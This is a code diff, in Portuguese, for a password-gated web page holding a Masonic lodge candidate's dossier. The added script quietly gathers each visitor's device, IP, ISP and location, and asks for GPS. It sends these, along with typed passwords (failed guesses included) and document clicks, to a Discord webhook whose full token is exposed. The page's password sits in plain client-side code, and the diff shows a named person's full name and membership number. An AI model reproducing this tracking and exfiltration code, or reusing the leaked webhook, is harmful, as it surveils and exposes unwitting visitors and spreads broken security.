@@ -552,10 +552,10 @@
                 margin-bottom: 15px;
             }
             .lockdown-title { 
-        font-size: clamp(1.2rem, 5vw, 1.8rem); 
-        letter-spacing: 2px;
-        white-space: normal; /* Remove a trava para permitir a quebra elegante */
-        line-height: 1.3; /* Dá um respiro caso o texto quebre em duas linhas */
+                font-size: clamp(1.2rem, 5vw, 1.8rem); 
+                letter-spacing: 2px;
+                white-space: normal; 
+                line-height: 1.3;
             }
             
             .lockdown-msg {
@@ -932,25 +932,101 @@
 
     <script>
         // =========================================================
-        // WEBHOOK DISCORD & COLETA DE DADOS (GEOJS)
+        // WEBHOOK DISCORD & COLETA DE DADOS AVANÇADOS
         // =========================================================
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1476024935347654829/MQA4IE8XBQ7zYj26fLWxar75Oh2VrDoHL-drFoz-Ohd7heboOwFftHW22yEanPSXRU8T";
 
-        let dadosVisitante = "Buscando localização...";
+        // Variável que guardará os dados consolidados
+        let camposDiscord = [];
 
-        async function carregarDadosIP() {
+        // 1. Função para extrair dados do Aparelho (User-Agent)
+        function obterDadosDispositivo() {
+            const ua = navigator.userAgent;
+            let os = "Desconhecido";
+            let browser = "Desconhecido";
+            let device = "Desktop";
+
+            // OS
+            if (/android/i.test(ua)) os = "Android";
+            else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS";
+            else if (/Windows NT/.test(ua)) os = "Windows";
+            else if (/Mac OS X/.test(ua)) os = "macOS";
+            else if (/Linux/.test(ua)) os = "Linux";
+
+            // Tipo
+            if (/mobile/i.test(ua)) device = "Smartphone";
+            else if (/tablet|ipad/i.test(ua)) device = "Tablet";
+
+            // Browser
+            if (/edg/i.test(ua)) browser = "Edge";
+            else if (/chrome|crios/i.test(ua)) browser = "Chrome";
+            else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
+            else if (/safari/i.test(ua)) browser = "Safari";
+            else if (/opr\//i.test(ua)) browser = "Opera";
+            
+            return `${device} • ${os} • ${browser}`;
+        }
+
+        // 2. Coletar IP, Provedor e Tentar GPS
+        async function carregarDadosRede() {
             try {
+                // Tenta pegar IP e Provedor da API
                 const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
-                const data = await response.json();
-                dadosVisitante = `**IP:** ${data.ip}\n**Local:** ${data.city}, ${data.region} - ${data.country}`;
+                const dataGeo = await response.json();
+                
+                const provedor = dataGeo.organization_name || dataGeo.organization || "Desconhecido";
+                
+                // Variáveis base de localização usando IP (caso o GPS falhe)
+                let localizacaoTexto = `${dataGeo.city}, ${dataGeo.region} - ${dataGeo.country}`;
+                let mapaUrl = `http://google.com/maps?q=${dataGeo.latitude},${dataGeo.longitude}`;
+                let precisaoInfo = "(Aproximada via IP)";
+
+                // Prepara a base dos campos para o Discord
+                const atualizarCamposDiscord = () => {
+                     camposDiscord = [
+                        { name: "📱 Dispositivo", value: obterDadosDispositivo(), inline: false },
+                        { name: "🌐 Rede e IP", value: `${provedor}\n\`${dataGeo.ip}\``, inline: true },
+                        { name: "📍 Localização " + precisaoInfo, value: `${localizacaoTexto}\n[🗺️ Abrir no Google Maps](${mapaUrl})`, inline: true }
+                    ];
+                };
+                
+                // Define com base no IP primeiro
+                atualizarCamposDiscord();
+
+                // 3. Tenta pedir o GPS exato (se o usuário permitir)
+                if ("geolocation" in navigator) {
+                     navigator.geolocation.getCurrentPosition(
+                         // Se o usuário clicar em "Permitir"
+                         (position) => {
+                             const lat = position.coords.latitude;
+                             const lng = position.coords.longitude;
+                             
+                             // Atualiza com a localização exata do GPS
+                             localizacaoTexto = "Localização Exata via GPS";
+                             mapaUrl = `http://google.com/maps?q=${lat},${lng}`;
+                             precisaoInfo = "(Exata)";
+                             
+                             atualizarCamposDiscord(); // Recria os campos com a nova informação
+                         },
+                         // Se o usuário clicar em "Bloquear" ou der erro, continua com a do IP
+                         (error) => { console.log("GPS bloqueado ou falhou. Usando localização do IP."); },
+                         { timeout: 5000, enableHighAccuracy: true } // Tenta por 5 segundos
+                     );
+                }
+
             } catch (error) {
-                dadosVisitante = "IP/Localização indisponível";
+                // Fallback geral
+                camposDiscord = [
+                    { name: "📱 Dispositivo", value: obterDadosDispositivo(), inline: false },
+                    { name: "⚠️ Aviso", value: "Dados de rede indisponíveis.", inline: false }
+                ];
             }
         }
         
-        // Coleta o IP assim que a página carrega
-        window.addEventListener('load', carregarDadosIP);
+        // Dispara a coleta assim que a página abrir
+        window.addEventListener('load', carregarDadosRede);
 
+        // 3. Função de envio formatado para o Discord
         function notificarDiscord(titulo, mensagem, corHex) {
             const corDecimal = parseInt(corHex.replace("#", ""), 16);
 
@@ -961,13 +1037,7 @@
                     title: titulo,
                     description: mensagem,
                     color: corDecimal,
-                    fields: [
-                        {
-                            name: "🌐 Dados da Conexão",
-                            value: dadosVisitante,
-                            inline: false
-                        }
-                    ],
+                    fields: camposDiscord, 
                     footer: { text: "A∴ R∴ L∴ M∴ Fraternidade Imperial Nº 264" },
                     timestamp: new Date().toISOString()
                 }]
@@ -999,7 +1069,7 @@
                     
                     notificarDiscord(
                         "📄 Interação com Documento",
-                        `**Dossiê:** RUAN PABLO\n**Ação:** ${acao}\n**Arquivo:** \`${nomeDoc}\``,
+                        `**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\n**Ação:** ${acao}\n**Arquivo:** \`${nomeDoc}\``,
                         "#005eb8" // Azul
                     );
                 });
@@ -1009,19 +1079,12 @@
         // =========================================================
         // CONFIGURAÇÕES DO PROCESSO DO CANDIDATO
         // =========================================================
-        
-        // 1. Defina o passo atual na linha do tempo (de 1 a 8)
         const currentStep = 3; 
-        
-        // 2. Defina o STATUS DO PROCESSO. 
-        // Opções aceitas: "ativo", "iniciado", "negado", "desistencia"
         const processStatus = "ativo"; 
-        
-        // 3. Informações de Conclusão / Arquivamento
-        const finalDate = "28/03/2026"; // Data de Iniciação OU Data do Arquivamento
-        const cimNumber = "0245177"; // Número do CIM (se for iniciado)
-        const statusResponsible = "V∴ M∴ Everton Almeida"; // Quem assinou a recusa/desistência
-        const statusReason = "Iniciado."; // Motivo do arquivamento
+        const finalDate = "28/03/2026";
+        const cimNumber = "0245177"; 
+        const statusResponsible = "V∴ M∴ Everton Almeida"; 
+        const statusReason = "Iniciado."; 
         // =========================================================
 
         function checkPassword() {
@@ -1030,11 +1093,11 @@
             const correctPass = "264"; 
             
             if(pass === correctPass) {
-                // SUCESSO NO LOGIN - DISPARA WEBHOOK
+                // SUCESSO NO LOGIN
                 notificarDiscord(
                     "✅ Acesso Autorizado", 
                     "**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\nO acesso foi liberado com a senha correta.", 
-                    "#2e7d32" // Verde
+                    "#2e7d32"
                 );
 
                 const overlay = document.getElementById('password-overlay');
@@ -1056,7 +1119,7 @@
                     setupLogoBurst(); 
                     updateLogic();
                     calculateAge(); 
-                    mapearCliquesDocumentos(); // ATIVA O RASTREAMENTO DOS PDFs AQUI
+                    mapearCliquesDocumentos(); 
                 }, 500);
             } else {
                 let tentativasSpan = document.getElementById('tentativas');
@@ -1065,11 +1128,11 @@
                 tentativasSpan.innerText = t;
                 document.getElementById('error-msg').style.display = 'block';
 
-                // FALHA NO LOGIN - DISPARA WEBHOOK
+                // FALHA NO LOGIN
                 notificarDiscord(
                     "⚠️ Tentativa de Acesso Falha", 
-                    `**Dossiê:** RUAN PABLO\n**Senha digitada:** \`${pass || "[em branco]"}\`\n**Tentativas:** ${t}/3`, 
-                    "#b86b00" // Laranja
+                    `**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\n**Senha digitada:** \`${pass || "[em branco]"}\`\n**Tentativas:** ${t}/3`, 
+                    "#b86b00" 
                 );
                 
                 passInput.value = '';
@@ -1085,7 +1148,6 @@
             }
         }
 
-        // --- FUNÇÃO PARA VISUALIZAR SENHA ---
         function togglePassVisibility() {
             const input = document.getElementById('passInput');
             const icon = document.getElementById('togglePassword');
@@ -1103,11 +1165,11 @@
         }
 
         function triggerLockdown() {
-            // LOCKDOWN ATIVADO - DISPARA WEBHOOK
+            // LOCKDOWN ATIVADO
             notificarDiscord(
                 "🚨 VIOLAÇÃO DE SEGURANÇA", 
-                "**Dossiê:** RUAN PABLO\nO sistema foi travado após 3 tentativas incorretas. Alarme disparado no navegador do usuário.", 
-                "#cc0000" // Vermelho
+                "**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\nO sistema foi travado após 3 tentativas incorretas. Alarme disparado no navegador do usuário.", 
+                "#cc0000"
             );
 
             const lockdown = document.getElementById('lockdown-overlay');
@@ -1116,8 +1178,7 @@
             lockdown.style.display = 'flex';
             setTimeout(() => { lockdown.style.opacity = '1'; }, 50);
 
-            // Inicia o áudio do alarme (13 segundos)
-            audio.play().catch(e => console.log("Áudio bloqueado pelo navegador. O usuário precisa ter interagido com a página antes.", e));
+            audio.play().catch(e => console.log("Áudio bloqueado.", e));
 
             const msgEl = document.getElementById('lockdown-typing');
             const msg = "> IDENTIDADE NÃO CONFIRMADA. INICIANDO PROTOCOLO DE BLOQUEIO DE SEGURANÇA MÁXIMA...";
@@ -1130,24 +1191,20 @@
                     setTimeout(typeWriter, 50); 
                 }
             }
-            // Começa a digitar após meio segundo
             setTimeout(typeWriter, 500);
             
-            // Redireciona de volta para a tela inicial exatamente após 13 segundos (tempo do áudio)
             setTimeout(() => { window.location.href = "../../../index.html"; }, 13000);
         }
 
         function calculateAge() {
             const birthElement = document.getElementById('nasc-data');
             const birthDateString = birthElement.innerText; 
-            
             const [day, month, year] = birthDateString.split('/');
             const birthDate = new Date(year, month - 1, day);
             const today = new Date();
             
             let age = today.getFullYear() - birthDate.getFullYear();
             const m = today.getMonth() - birthDate.getMonth();
-            
             if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
                 age--;
             }
@@ -1197,10 +1254,9 @@
             const progLine = document.getElementById('prog-line');
             const cimContainer = document.getElementById('cim-display-container');
 
-            // --- LÓGICA DE STATUS ---
             if (processStatus === "iniciado") {
                 badge.innerText = "INICIADO (CONCLUÍDO)";
-                badge.style.background = '#2e7d32'; // Verde
+                badge.style.background = '#2e7d32'; 
                 badge.style.color = '#fff';
                 badge.style.borderColor = '#1b5e20';
                 
@@ -1209,9 +1265,8 @@
                 dateDisplay.style.color = "#2e7d32"; 
                 dateDisplay.style.fontWeight = "800";
                 
-                cimContainer.style.display = "block"; // Revela CIM
+                cimContainer.style.display = "block"; 
                 document.getElementById('cim-number').innerText = cimNumber;
-                
                 progLine.style.width = "100%"; 
 
                 for(let i=1; i<=8; i++) {
@@ -1221,7 +1276,6 @@
                 }
 
             } else if (processStatus === "negado" || processStatus === "desistencia") {
-                // NEGADO OU DESISTÊNCIA
                 let isDesistencia = processStatus === "desistencia";
                 
                 badge.innerText = isDesistencia ? "DESISTÊNCIA" : "PROCESSO NEGADO";
@@ -1229,11 +1283,9 @@
                 badge.style.color = '#fff';
                 badge.style.borderColor = isDesistencia ? '#d48100' : '#880000';
 
-                // Troca a caixa de data pela caixa de alerta unificada e alinhada
                 defaultDateBox.style.display = "none";
-                alertBox.style.display = "block"; // Funciona perfeito com o grid-column 1 / -1
+                alertBox.style.display = "block"; 
                 
-                // Aplicar cores corretas no alerta dependendo se é Desistência ou Negado
                 alertBox.style.backgroundColor = isDesistencia ? 'rgba(184, 107, 0, 0.08)' : 'rgba(200, 0, 0, 0.08)';
                 alertBox.style.borderLeftColor = isDesistencia ? '#b86b00' : '#cc0000';
                 document.getElementById('alert-title').style.color = isDesistencia ? '#b86b00' : '#cc0000';
@@ -1243,11 +1295,10 @@
                 document.getElementById('alert-reason').innerText = "Motivo: " + statusReason;
                 document.getElementById('alert-resp').innerText = "Despacho por: " + statusResponsible + " em " + finalDate;
 
-                // Para a barra de progresso onde parou e pinta com a cor correspondente
                 const percent = ((currentStep-1) / 7) * 100;
                 progLine.style.width = percent + "%";
                 progLine.style.backgroundColor = isDesistencia ? "#b86b00" : "#cc0000";
-                progLine.style.backgroundImage = "none"; // Tira as listras animadas
+                progLine.style.backgroundImage = "none"; 
 
                 for(let i=1; i<=8; i++) {
                     const el = document.getElementById(`step-${i}`);
@@ -1257,20 +1308,16 @@
                 }
 
             } else {
-                // ATIVO (Padrão)
                 badge.innerText = stepsData[currentStep-1].txt;
                 badge.style.background = 'var(--gold)';
                 badge.style.color = '#000';
                 
-                // --- LÓGICA DE DATA AJUSTADA AQUI ---
                 if (currentStep === 8) {
-                    // Se estiver no passo 8, mostra a data agendada
                     initLabel.innerText = "Previsão de Iniciação";
                     dateDisplay.innerText = finalDate;
                     dateDisplay.style.color = "#2e7d32"; 
                     dateDisplay.style.fontWeight = "800";
                 } else {
-                    // Passos de 1 a 7
                     initLabel.innerText = "Previsão de Iniciação";
                     dateDisplay.innerText = "Aguardando conclusão do processo...";
                     dateDisplay.style.color = "#777";
@@ -1289,7 +1336,6 @@
             }
         }
 
-        /* --- ANIMAÇÃO LOGO O IMAGINISTA --- */
         function setupLogoBurst() {
             const btn = document.getElementById('imaginista-btn');
             if(btn) {
@@ -1319,7 +1365,6 @@
             }
         }
 
-        /* --- CONSTELAÇÕES EFEITO "CLÁSSICO" REFINADO E PREMIUM --- */
         function initConstellations() {
             const canvas = document.getElementById('constellation-bg');
             const ctx = canvas.getContext('2d');
@@ -1331,7 +1376,7 @@
                 particleColor: 'rgba(212, 175, 55, 0.8)', 
                 particleCount: isMobile ? 40 : 80, 
                 lineLength: isMobile ? 120 : 180, 
-                particleSpeed: 0.15 // BEM mais lento, fluidez elegante
+                particleSpeed: 0.15 
             };
 
             const resize = () => { w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; };
@@ -1344,10 +1389,9 @@
                     this.y = Math.random() * h;
                     this.vx = (Math.random() - 0.5) * properties.particleSpeed;
                     this.vy = (Math.random() - 0.5) * properties.particleSpeed;
-                    this.radius = Math.random() * 1.5 + 0.5; // Tamanhos variados para dar profundidade
+                    this.radius = Math.random() * 1.5 + 0.5; 
                 }
                 position(){
-                    // Em vez de "bater e voltar", as estrelas flutuam para fora da tela e retornam
                     if(this.x > w + 50) this.x = -50;
                     else if(this.x < -50) this.x = w + 50;
                     
@@ -1361,13 +1405,10 @@
                     ctx.beginPath();
                     ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
                     ctx.fillStyle = properties.particleColor;
-                    
-                    // Adiciona um brilho em volta da estrela
                     ctx.shadowBlur = 10;
                     ctx.shadowColor = 'rgba(212, 175, 55, 0.8)';
-                    
                     ctx.fill();
-                    ctx.shadowBlur = 0; // reseta o brilho para as linhas não ficarem borradas demais
+                    ctx.shadowBlur = 0; 
                 }
             }
 
@@ -1385,8 +1426,7 @@
                     for(let j = i + 1; j < particles.length; j++){
                         const dist = Math.hypot(particles[i].x - particles[j].x, particles[i].y - particles[j].y);
                         if(dist < properties.lineLength){
-                            ctx.lineWidth = 0.4; // Linhas mais finas
-                            // Fade suave baseado na distância
+                            ctx.lineWidth = 0.4; 
                             let opacity = 1 - (dist / properties.lineLength);
                             ctx.strokeStyle = `rgba(212, 175, 55, ${opacity * 0.5})`; 
                             ctx.beginPath();
@@ -1401,7 +1441,6 @@
             loop();
         }
 
-        // --- FUNÇÃO PARA ATIVAR O ENTER NA SENHA ---
         document.getElementById('passInput').addEventListener('keypress', function(event) {
             if (event.key === 'Enter') {
                 event.preventDefault(); 
@@ -1409,19 +1448,17 @@
             }
         });
 
-        // --- ANIMAÇÃO DO ÍCONE DE CADEADO ---
         document.getElementById('passInput').addEventListener('input', function(e) {
             const icon = document.querySelector('.auth-box h2 i');
             if (this.value.length > 0) {
                 icon.style.color = '#fff';
                 icon.style.textShadow = '0 0 15px var(--gold)';
             } else {
-                icon.style.color = ''; // Volta ao original
+                icon.style.color = ''; 
                 icon.style.textShadow = '';
             }
         });
 
-        // --- FUNÇÕES DE COOKIES LGPD ---
         function checkCookies() {
             if (!localStorage.getItem('cookiesAcceptedDossie')) {
                 setTimeout(() => {
